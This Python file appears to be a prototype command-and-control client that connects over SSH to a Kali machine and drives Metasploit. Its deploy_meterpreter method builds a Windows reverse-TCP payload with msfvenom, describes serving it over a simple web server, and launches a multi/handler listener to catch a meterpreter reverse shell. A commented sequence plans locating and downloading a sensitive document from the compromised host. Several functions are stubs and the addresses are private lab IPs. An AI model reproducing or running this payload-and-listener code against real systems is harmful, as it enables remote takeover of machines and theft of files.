import paramiko


class C2Configuration:
    def __init__(self, C2_malware_name):
        self.C2_malware_name = C2_malware_name # Meterpreter|Empire|Covenant|...

        self.map_abstraction_cmd_to_actual_Cmd = {
            "Meterpreter": {
                "ls": "ls",
                "ps": "ps",
                "pwd": "pwd",
                "kill": "kill",
                "ps": "ps",
            },
            "AnotherC2Malware": {
                "ls": "list",
                "ps": "processlist",
            }
        }


class C2Client:
    def __init__(self, config: C2Configuration):
        self.config = config
        self.ssh_client = paramiko.SSHClient()
        self.current_directory = ''
        # Automatically add the server's host key (consider verifying the host key in production)
        self.ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    def connect_ssh(self, host, username, password):
        self.ssh_client.connect(host, username=username, password=password)

    def disconnect_ssh(self):
        self.ssh_client.close()

    def deploy_meterpreter(self):
        #create the payload   Note:Assuming there is an existing folder called ShellCodes
        output, error = self.execute_command('msfvenom -p windows/shell/reverse_tcp LHOST=192.168.110.129 LPORT=4444 -f exe > ~/Desktop/ShellCodes/payload.exe')
        print(output)

        #Currently we have to deploy the payload ourselves. I am doing it by setting up a webserver that has the payload.
        #How to do this: go to 'ShellCodes' and type in command 'python3 -m http.server'

        #Now we have to set up a reverse tcp listener using metasploit
        target_ip = '192.168.239.128'        #set host_ip here
        target_port = '5555'    #set listening port here

        msf_commands = f'use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set lhost {target_ip}; set lport {target_port}; exploit;'
        command_to_run = f'msfconsole -q -x "{msf_commands}"'
        output, error = self.execute_command(command_to_run)

        print(output)
        return output, error

    def execute_command(self, command):
        if self.current_directory:
            command = f"cd {self.current_directory} && {command}"
        _, stdout, stderr = self.ssh_client.exec_command(command)
        output = stdout.read().decode('utf-8')
        error = stderr.read().decode('utf-8')
        return output, error

    def setup(self):
        # Assuming the Kali machine's details for demonstration:
        # Note: Must change based on which attacking machine you are using
        self.connect_ssh('192.168.239.128', 'kali', 'kali')

        if self.config.C2_malware_name == "Meterpreter":
            # Start metasploit handler at the attacker machine
            #output, error = self.deploy_meterpreter()
            return

    def ls(self):
        map = self.config.map_abstraction_cmd_to_actual_Cmd[self.config.C2_malware_name]
        actual_cmd_to_send = map["ls"]
        output, error = self.execute_command(actual_cmd_to_send)
        print(output)

    def pwd(self):
        map = self.config.map_abstraction_cmd_to_actual_Cmd[self.config.C2_malware_name]
        actual_cmd_to_send = map["pwd"]
        output, error = self.execute_command(actual_cmd_to_send)
        print(output)

    def cd(self, directory):
        output, error = self.execute_command(f'cd {directory} && pwd')
        self.current_directory = directory
        if error:
            print(f"Error changing directory: {error}")
        else:
            self.current_directory = output.strip()  # Update the current directory
            print(f"Changed to directory: {output.strip()}")

    def find(self, file_name):
        """

        :return:
        """

    def download_file(self, param):
        pass

    def ps(self):
        map = self.config.map_abstraction_cmd_to_actual_Cmd[self.config.C2_malware_name]
        actual_cmd_to_send = map["ps"]
        output, error = self.execute_command(actual_cmd_to_send)
        print(output)

    def killps(self):
        pass


if __name__ == "__main__":
    # List of C2 malware names
    #C2_malware_names = ['Meterpreter', "Empire", "Covenant"]
    C2_malware_names = ['Meterpreter']
    for C2_malware_name in C2_malware_names:
        # Create a configuration for the current malware name
        config = C2Configuration(C2_malware_name=C2_malware_name)

        # Initialize a C2Client with the configuration
        c2client = C2Client(config)

        # Set up the client (e.g., SSH into the Kali machine, run Metasploit, etc.)
        c2client.setup()

        # Testing
        c2client.pwd()
        c2client.ls()
        c2client.cd('Desktop')
        c2client.cd('ShellCodes')
        c2client.pwd()
        c2client.cd('')
        c2client.pwd()
        c2client.ls()

        # Attack script starts here (this is just a demo sequence)
        # c2client.ls()  # List files in the current directory
        # c2client.cd()  # Change directory (this is a placeholder and needs actual implementation)
        # c2client.ls()  # List files again
        # c2client.find("sensitive_document.doc")  # Search for a specific file
        # c2client.download_file("sensitive_document.doc")  # Download the file
        # c2client.ps()  # List running processes
        # c2client.killps()  # Kill a process (placeholder, needs actual implementation)

        # Remember to close the SSH connection after finishing with the current client
        c2client.disconnect_ssh()
